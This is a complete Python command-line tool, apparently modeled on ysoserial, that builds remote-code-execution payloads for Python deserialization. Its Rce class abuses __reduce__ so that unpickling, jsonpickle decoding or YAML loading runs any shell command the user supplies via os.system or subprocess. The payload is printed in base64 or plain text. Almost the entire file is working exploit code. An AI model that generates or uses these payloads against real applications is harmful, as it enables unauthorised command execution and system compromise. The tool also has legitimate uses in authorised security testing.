#!/usr/bin/env python3

from argparse import ArgumentParser
from base64 import b64encode
import pickle
import jsonpickle
import yaml


class Pysoserial:
    def __init__(self, serializer: str, library: str, plaintext: bool) -> None:
        self.serializer = serializer
        self.library = library
        self.plaintext = plaintext

    def generate(self, payload: str) -> str:
        class Rce:
            def __init__(self, library: str, command: str) -> None:
                self.library = library
                self.command = command

            def __reduce__(self):
                if self.library == 'os':
                    import os
                    return os.system, (f"/bin/sh -c '{self.command}'",)
                import subprocess
                # Use call method instead of Popen to be able to determine elapsed time
                return subprocess.call, (('/bin/sh', '-c', self.command), 0)

        pickled = b''
        rce = Rce(self.library, payload)
        if self.serializer == 'pickle':
            pickled = pickle.dumps(rce, protocol=0)
        elif self.serializer == 'json':
            pickled = jsonpickle.encode(rce).encode()
        elif self.serializer == 'yaml':
            # Note that in yaml >= 5.4 (https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf):
            # "Only class type objects are allowed to deserialize which are present in the script or imported in the script."
            # Yoy may want to use subprocess.Popen or other classes in that case.
            pickled = yaml.dump(rce).encode()

        if self.plaintext:
            return pickled.decode()
        return b64encode(pickled).decode()


def main() -> None:
    # PARSER
    parser = ArgumentParser('pysoserial.py')
    parser.add_argument('-p', '--payload', required=True, help='payload to execute')
    parser.add_argument('-l', '--library', required=True,
                        choices=['os', 'subprocess'], help='library to execute the payload with')
    parser.add_argument('-s', '--serializer', required=True,
                        choices=['pickle', 'json', 'yaml'],
                        help='serializer to generate the payload for')
    parser.add_argument('--plaintext', default=False, action="store_true",
                        help='print result in plain text (default is base64)')
    # END PARSER

    args = parser.parse_args()
    pysoserial = Pysoserial(args.serializer, args.library, args.plaintext)
    output = pysoserial.generate(args.payload)
    print(output)

if __name__ == "__main__":
    main()
